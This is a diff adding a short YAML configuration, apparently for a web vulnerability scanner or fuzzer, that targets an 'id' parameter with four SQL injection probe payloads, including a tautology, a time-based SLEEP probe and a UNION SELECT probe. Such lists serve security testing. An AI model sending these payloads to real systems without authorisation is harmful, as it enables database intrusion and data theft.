@@ -1,0 +1,7 @@
+name: sqli
+param: id
+payloads:
+  - "'"
+  - "' OR '1'='1"
+  - "1' AND SLEEP(5)-- -"
+  - "1 UNION SELECT NULL-- -"
